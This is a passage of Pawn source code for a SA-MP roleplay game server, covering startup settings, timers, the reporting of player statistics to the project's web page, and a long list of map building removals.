	tick1 = GetTickCount();
	
    AntiDeAMX();
    
    printf("\n A carregar Paradise City Roleplay\n");
    
	g_Socket = socket_create(TCP);
	
	if(is_socket_valid(g_Socket))
	{
		socket_set_max_connections(g_Socket, 10);
		socket_listen(g_Socket, 59847);
	}
    
	new rconcmd[128];
	
	format(rconcmd, sizeof(rconcmd), "hostname %s", HOSTNAME);
	SendRconCommand(rconcmd);
	format(rconcmd, sizeof(rconcmd), "mapname %s", MAPNAME);
	SendRconCommand(rconcmd);
	format(rconcmd, sizeof(rconcmd), "weburl %s", WEBSITE);
	SendRconCommand(rconcmd);
	format(rconcmd, sizeof(rconcmd), "language %s", LANGUAGE);
	SendRconCommand(rconcmd);
	format(rconcmd, sizeof(rconcmd), "gamemodetext %s", GAMEMODENAME);
	SendRconCommand(rconcmd);
	SendRconCommand("ackslimit 6000");
	
	SetWeather(1);
    CarregarServidor();
	
	SetTimer("GuardarServidor", 1800000, true); // 30 min
	SetTimer("AtualizarTodasCaravanasPos", 500, true); // 1/2 sec
	SetTimer("Relogio", 1000, true);
	SetTimer("NaoExplode", 2000, true);
	//SetTimer("UpdateMySQLInfo", 1800000, true); // 30 min
	
	tick2 = GetTickCount();
	
	currentSlots = SLOTSRESERVADOS;

	printf("\n\n Paradise City Roleplay carregado com sucesso (%d ms)\n\n\n", tick2-tick1);
	
	return 1;
}

public NaoExplode()
{
    for(new c = 0; c < MAX_CARROS; c++)
    {
        if(Motor[c] == true) continue;
        
		new Float:cVida;
		GetVehicleHealth(c, cVida);

		if(cVida < 300.0)
		{
		    SetVehicleHealth(c, 300.0);
		}
	}

	return 1;
}

public HttpInfo(index, response_code, data[])
{
	new string[64];
	
    if(response_code == 200)
    {
        if(strfind(data, "Undefined index", true) != -1 || strfind(data, "Error", true) != -1)
        {
			ErrorLog("Error on: sendinfo.php");
        }
    }
    else
    {
        format(string, sizeof(string), "HTTP ERROR on sendinfo.php (Error:%d)", response_code);
        ErrorLog(string);
    }
    
	return 1;
}

public UpdateMySQLInfo()
{
	new currentTimestamp = gettime();
	new onlinePlayers = GetOnlinePlayers();
	new adminsOnline = 0;
	
	new vipsOnline = 0;
	new ajOnline = 0;
	
	new policiaOnline = 0;
	new medicoOnline = 0;
	new mecOnline = 0;
	new newsOnline = 0;
	new govOnline = 0;
	new drogasOnline = 0;
	new mafiaOnline = 0;
	new srOnline = 0;
	
	new string[256];
	
 	foreach(new i : Player)
    {
		if(pInfo[i][Admin] > 0) adminsOnline++;
		if(pInfo[i][Golds] > 0) vipsOnline++;
		if(pInfo[i][Jailed] == 1) ajOnline++;
		
		if(pInfo[i][Faction] != 0)
		{
		    switch(fInfo[pInfo[i][Faction]][Type])
		    {
		        case F_POLICIA: policiaOnline++;
		        case F_MEDICOS: medicoOnline++;
		        case F_MECANICOS: mecOnline++;
		        case F_NEWS: newsOnline++;
		        case F_GOVERNO: govOnline++;
		        case F_DROGAS: drogasOnline++;
		        case F_MAFIA: mafiaOnline++;
		        case F_SR: srOnline++;
		    }
		}
    }
    
    format(string, sizeof(string),"tools.portugalfunmaps.pt/gta/PCRP/sendinfo.php?pw=%s&\
	timestamp=%d&\
	onlineplayers=%d&\
	adminsonline=%d&\
	vipsonline=%d&\
	ajonline=%d&\
	policiaonline=%d&\
	medicoonline=%d&\
	meconline=%d&\
	newsonline=%d&\
	govonline=%d&\
	drogasonline=%d&\
	mafiaonline=%d&\
	sronline=%d", HTTP_PASSWORD, currentTimestamp, onlinePlayers, adminsOnline, vipsOnline, ajOnline, policiaOnline, medicoOnline, mecOnline, newsOnline, govOnline, drogasOnline, mafiaOnline, srOnline);
    
    HTTP(0, HTTP_GET, string, "", "HttpInfo");
	
	return 1;
}

public OnGameModeExit()
{
    foreach(new i : Player)
    {
        GuardarJogador(i);
    }
    
   	if(is_socket_valid(g_Socket))
   	{
   	    socket_destroy(g_Socket);
   	}
    
    DOF2_Exit();
    
    printf("\nA desligar Paradise City Roleplay...");
    
    return 1;
}

public OnIncomingConnection(playerid, ip_address[], port)
{
    IncomingLog(playerid, ip_address, port);
    
    return 1;
}

public OnPlayerConnect(playerid)
{
	sStats[0][JoinCount]++;

	for(new i = 0; i < 52; i++)
	{
		EnableAntiCheatForPlayer(playerid, i, 0);
	}
	
    RemoveBuildingForPlayer(playerid, 6400, 488.2813, -1734.6953, 12.3906, 0.25); // pay n spray praia

	RemoveBuildingForPlayer(playerid, 4009, 1421.3750, -1477.6016, 42.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 4024, 1479.8672, -1790.3984, 56.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 4025, 1777.8359, -1773.9063, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 4026, 1497.7969, -1543.7109, 17.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1098.4141, -1725.7422, 12.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 4044, 1481.1875, -1785.0703, 22.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 4054, 1402.5000, -1682.0234, 25.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 4055, 1394.3594, -1620.6641, 32.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 4062, 1529.5000, -1470.5313, 32.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4065, 1654.5938, -1637.7422, 28.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 4070, 1719.7422, -1770.7813, 23.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 4105, 1224.6953, -1782.2031, 29.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 4116, 1345.6250, -1552.9609, 48.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 4118, 1404.9063, -1539.2969, 20.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 4187, 1664.6484, -1691.3203, 16.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 4194, 1360.3828, -1840.6172, 26.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 1527, 1448.2344, -1755.8984, 14.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1531, 1724.7344, -1741.5000, 14.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 4213, 1654.2813, -1636.8750, 57.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 4215, 1777.5547, -1775.0391, 36.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 4218, 1497.7031, -1546.6172, 43.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 4220, 1370.6406, -1643.4453, 33.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 4221, 1406.7109, -1499.5625, 69.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 4222, 1575.9375, -1516.5781, 36.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 4226, 1359.2813, -1796.4688, 24.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1261, 1638.5859, -1721.4766, 27.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 4229, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 4230, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1496.8672, -1707.8203, 13.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1265, 1336.1563, -1844.0156, 12.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1372, 1336.3359, -1842.8516, 12.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 1265, 1336.3750, -1841.5391, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1196.6016, -1840.3828, 12.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1240.5547, -1840.0938, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1256.2266, -1839.9766, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1249.5078, -1840.3828, 12.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1281.8750, -1840.0938, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1235.8359, -1839.8125, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1192.8281, -1839.8125, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1244.5000, -1839.8125, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1839.8125, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1200.8828, -1839.1250, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1227.5547, -1839.1250, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1192.8281, -1829.2813, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1828.4219, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1192.6172, -1826.9531, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1195.3594, -1820.2734, 13.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1219.5234, -1823.4922, 13.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1233.3828, -1822.8359, 13.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 4183, 1227.1875, -1820.1250, 14.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1284.8906, -1823.8594, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1820.7422, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1233.8828, -1811.5156, 13.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1286.3047, -1808.6094, 12.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1796.8984, 14.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1285.1250, -1799.9766, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 1265, 1337.2578, -1841.8750, 13.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 4193, 1360.3828, -1840.6172, 26.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1340.8906, -1835.3672, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1230, 1340.1328, -1835.0391, 12.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1340.8672, -1834.4844, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1265, 1336.8750, -1818.2266, 12.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1372, 1336.7891, -1816.3047, 12.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1338.1250, -1816.5781, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1230, 1338.0781, -1815.7578, 12.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1338.8984, -1816.1641, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1342.2734, -1806.2031, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1230, 1342.6328, -1807.0391, 12.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1221, 1342.5156, -1805.0703, 12.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1338.9531, -1796.4297, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 4023, 1359.2813, -1796.4688, 24.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 4102, 1105.3906, -1794.9063, 15.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1164.5938, -1782.3594, 13.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1190.2891, -1782.2734, 13.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 4101, 1224.6953, -1782.2031, 29.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1190.2891, -1769.3359, 13.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1277.4922, -1770.5625, 13.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1765.7344, 14.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1284.9766, -1761.1719, 14.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1190.2891, -1754.7891, 13.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1192.1016, -1738.0000, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1190.2891, -1741.2422, 13.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1192.1016, -1733.0156, 14.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1192.5625, -1723.8828, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1198.3203, -1724.5859, 14.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1204.4844, -1724.8516, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1207.8047, -1722.7656, 13.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1221.0234, -1722.7656, 13.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1257.5781, -1724.6875, 14.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1250.9844, -1723.8828, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1233.4844, -1722.7656, 13.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1247.2344, -1722.7656, 13.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1263.9844, -1724.8516, 13.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 1277.4922, -1751.3359, 13.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1279.6563, -1724.7344, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1230, 1338.9609, -1796.0000, 13.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 1220, 1338.9375, -1795.4609, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1221, 1338.9688, -1793.7266, 12.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 4002, 1479.8672, -1790.3984, 56.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3980, 1481.1875, -1785.0703, 22.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 4003, 1481.0781, -1747.0313, 33.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1713.5078, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1716.7031, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1713.7031, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1289, 1504.7500, -1711.8828, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1419.3281, -1710.2344, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1704.7656, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 4195, 1381.5859, -1698.0156, 14.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 4005, 1402.5000, -1682.0234, 25.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1692.2344, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1445.8125, -1650.0234, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1378.8125, -1623.3828, 14.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1379.2422, -1622.4531, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1375.6406, -1621.8672, 14.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1382.0469, -1621.8672, 14.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 4006, 1394.3594, -1620.6641, 32.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 4196, 1361.2188, -1604.5938, 14.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 4113, 1345.6250, -1552.9609, 48.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 4008, 1404.9063, -1539.2969, 20.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 3586, 1430.2344, -1496.2266, 16.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 4007, 1421.3750, -1477.6016, 42.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 4205, 1432.6875, -1473.6094, 15.3281, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1434.5313, -1501.1016, 21.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1435.8672, -1496.2500, 21.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.7266, -1710.0625, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.6563, -1707.6875, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1704.6406, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1701.5703, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1702.5313, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.5547, -1697.2891, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1694.0469, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1692.3906, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.1250, -1687.5625, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1690.6484, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1458.6172, -1684.1328, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.2734, -1666.2969, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1682.7188, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1471.4063, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1458.2578, -1659.2578, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1449.8516, -1655.9375, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1477.9375, -1652.7266, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.3516, -1650.5703, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1454.4219, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1466.4688, -1637.9609, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1449.5938, -1635.0469, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8906, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8359, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1704.5938, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1494.2109, -1694.4375, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1693.7344, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1496.9766, -1686.8516, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1494.1406, -1689.2344, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1682.6719, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1480.6094, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1488.2266, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.4141, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.3594, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 4016, 1497.7969, -1543.7109, 17.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1288, 1504.7500, -1705.4063, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1287, 1504.7500, -1704.4688, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1286, 1504.7500, -1695.0547, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1285, 1504.7500, -1694.0391, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.9609, -1684.6094, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.1641, -1662.0156, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.7188, -1670.9219, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1503.1875, -1621.1250, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1501.2813, -1624.5781, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.3594, -1616.9688, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 4180, 1502.6094, -1467.1250, 24.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1508.4453, -1668.7422, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1505.6953, -1654.8359, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1508.5156, -1647.8594, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1513.2734, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1510.8906, -1607.3125, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1229, 1524.2188, -1693.9688, 14.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1267, 1638.5859, -1721.4766, 27.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1641.0547, -1706.0234, 18.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1641.0547, -1689.4297, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1641.0547, -1680.2734, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 4014, 1664.6484, -1691.3203, 16.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1656.4922, -1689.3281, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1661.8438, -1689.2500, 18.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 4184, 1660.0781, -1674.1250, 22.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1661.8438, -1673.4688, 18.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1656.4922, -1673.5469, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1647.0234, -1663.5938, 22.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1664.0781, -1663.5938, 22.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1676.6328, -1689.4297, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1676.6328, -1683.8984, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1676.6328, -1673.2891, 18.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1688.5234, -1673.2188, 17.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 3986, 1719.7422, -1770.7813, 23.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 4019, 1777.8359, -1773.9063, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3979, 1654.5938, -1637.7422, 28.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 4013, 1654.5938, -1637.7422, 28.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 4015, 1654.5938, -1637.7422, 28.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 4188, 1654.5938, -1637.7422, 28.6406, 0.25);
	RemoveBuildingForPlayer(playerid, 4185, 1679.1016, -1634.8203, 13.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1525.3828, -1611.1563, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1646.1172, -1604.7969, 12.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1655.4141, -1604.7969, 12.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1664.7031, -1604.7969, 12.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1674.0000, -1604.7969, 12.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 4058, 1529.5000, -1470.5313, 32.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1216.0391, -2283.2500, 12.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1225.0000, -2258.6563, 8.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 671, 1097.0938, -2317.7500, 17.6484, 0.25);
	RemoveBuildingForPlayer(playerid, 661, 1098.9453, -2329.8438, 11.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 671, 1099.9531, -2322.0625, 15.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1164.3047, -2344.1719, 15.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1170.6172, -2338.5469, 13.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 671, 1175.3984, -2335.7422, 12.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 691, 1182.2109, -2327.5625, 12.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 691, 1218.7813, -2272.6484, 12.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 980.8047, -2186.8984, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1000.1328, -2132.2656, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1015.9531, -2078.9766, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1023.5938, -2050.6875, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1011.8594, -2043.5000, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 691, 1527.9453, -2082.8047, 24.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 3754, 1530.8750, -2029.4297, 33.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 5134, 2045.4922, -1903.6172, 16.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, 2632.3906, -1954.8203, 12.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 5219, 2289.7422, -2033.9531, 19.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 3710, 2788.1563, -2455.8828, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1525, 2065.4375, -1897.2344, 13.6094, 0.25);
	RemoveBuildingForPlayer(playerid, 5321, 2045.4922, -1903.6172, 16.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 1687, 2272.1094, -2049.2188, 21.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1468, 2301.7813, -2049.8594, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1468, 2297.4609, -2052.8828, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2304.2188, -2048.0938, 11.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1687, 2266.7969, -2043.3047, 21.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1468, 2258.0000, -2038.8984, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2259.7188, -2040.6641, 11.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 2271.0859, -2032.8438, 10.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1468, 2254.2734, -2035.1719, 13.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 5175, 2289.7422, -2033.9531, 19.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 5293, 2282.8203, -2033.5000, 20.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 1687, 2297.5859, -2031.8203, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 5372, 2282.8203, -2033.5000, 20.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 2044.0938, -1923.3359, 11.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 5231, 2085.2813, -1909.7109, 23.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 5374, 2085.2813, -1909.7109, 23.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 955, 2060.1172, -1897.6406, 12.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1315, 2078.6328, -1883.3281, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1307, 2071.8828, -1879.5625, 12.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2463.8203, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3624, 2788.1563, -2455.8828, 16.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2783.7813, -2448.4766, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2463.8203, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2797.5156, -2448.3438, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3761, 2791.9531, -2448.4766, 14.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 5265, 2678.9688, -2003.8125, 21.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3638, 2644.6172, -1955.7031, 15.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 3638, 2666.4375, -1955.7031, 15.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 3638, 2687.1250, -1955.7031, 15.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 5517, 1883.5234, -1576.4453, 20.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 5527, 2056.9844, -1830.5156, 20.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 5544, 1873.7422, -1682.4766, 34.7969, 0.25);
	RemoveBuildingForPlayer(playerid, 5634, 1931.3125, -1574.8438, 16.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 1261, 2062.0313, -1826.6406, 19.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 5532, 2056.9844, -1830.5156, 20.6016, 0.25);
